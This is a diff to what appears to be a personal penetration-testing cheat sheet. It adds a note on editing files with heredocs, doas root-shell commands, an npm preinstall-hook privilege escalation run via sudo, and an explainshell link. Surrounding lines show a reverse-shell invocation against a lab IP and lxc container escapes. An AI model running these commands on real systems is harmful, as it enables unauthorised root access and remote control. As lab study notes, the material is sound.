@@ -38,6 +38,10 @@ python3 py.py 10.10.13.118 "$(cat revshell.ps1)"
 ```
 gzip -d file.gz
 ```
+#### Change file without vim or nano
+```
+cat > file << EOF 
+```
 
 ---
 #### Reverse shells
@@ -146,13 +150,20 @@ lxc start ignite
 lxc exec ignite /bin/sh
 ```
 </details>
-<details><summary> priv esc with doas </summary>
+<details><summary> with doas </summary>
 
 ```
 doas -u root openssl enc -in file
 doas -u root /bin/bash
 ```
+</details>
+<details><summary> with npm -u </summary>
 
+```
+mkdir ~/tmp
+echo '{"scripts": {"preinstall": "/bin/sh"}}' > ~/tmp/package.json
+sudo -u serv-manage /usr/bin/npm -C ~/tmp/ --unsafe-perm i
+```
 </details>
 
 #### information gathering
@@ -293,6 +304,7 @@ rdesktop -u <username> -p <password> <ip> -g 70% -r disk:folder=/home/toor/cd/ap
 
 ### links
 * [database with CVE exploits](https://cvexploits.io/)
+* [explainshell.com](https://explainshell.com/)
 * [Linux Kernel CVEs](https://www.linuxkernelcves.com/cves)
 * [reverse shells](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 * [g0tmi1k priv esc linux](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
